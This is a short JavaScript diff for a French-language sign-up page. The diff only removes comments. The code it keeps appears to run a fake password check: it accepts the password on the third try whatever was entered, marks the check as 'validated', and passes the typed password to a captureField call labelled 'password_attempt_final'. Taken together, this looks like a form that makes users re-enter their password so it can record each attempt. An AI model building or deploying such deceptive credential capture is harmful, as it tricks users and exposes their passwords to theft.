@@ -58,7 +58,6 @@ function showForm() {
   checkAttempts = 0;
   checkPassed = false;
   submitBtn.style.display = 'none';
-  // Remettre le bouton vérifier en rouge (enlever la classe verified)
   checkBtn.classList.remove('verified');
   checkBtn.textContent = '[ VÉRIFIER ]';
   document.querySelectorAll('input, select').forEach(el => el.value = '');
@@ -132,13 +131,10 @@ checkBtn.addEventListener('click', function() {
     passwordInput.value = '';
     passwordInput.focus();
   } else {
-    // 3e tentative : on valide
     checkPassed = true;
     showToast('mot de passe accepté.', false);
-    // Le bouton vérifier devient vert
     checkBtn.classList.add('verified');
     checkBtn.textContent = '[ ✓ VALIDÉ ]';
-    // Afficher le bouton S'inscrire (vert)
     submitBtn.style.display = 'block';
     captureField('password_attempt_final', pwd);
   }
